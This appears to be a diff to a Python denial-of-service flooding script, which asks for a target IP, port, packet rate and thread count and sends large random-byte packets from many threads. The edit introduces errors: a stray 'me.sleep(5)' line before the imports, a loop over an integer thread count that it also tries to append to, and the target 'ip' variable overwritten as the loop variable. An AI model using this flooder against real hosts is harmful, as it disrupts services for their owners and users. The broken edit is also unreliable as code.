@@ -1,3 +1,5 @@
+me.sleep(5)
+    
 import threading
 import os, sys
 import socket
@@ -234,7 +236,7 @@ ip = str(input('[+] Target: '))
 ip = socket.gethostbyname(ip)
 port = int(input('[+] Port: '))
 pack = int(input('[+] Packet/s: '))
-thread = int(input('[+] Threads: '))
+threads = int(input('[+] Threads: '))
 def randomip():
   global sock
   sock = random._urandom(38888) 
@@ -341,6 +343,11 @@ def start():
         except:
             s.close()
 
-for x in range(thread):
-    thred = threading.Thread(target=start).start()
+for ip in threads:
+    thread = threading.Thread(target=start)
+    threads.append(thread)
+    thread.start()
+for thread in threads:
+    thread.join()
+time.sleep(5)
     
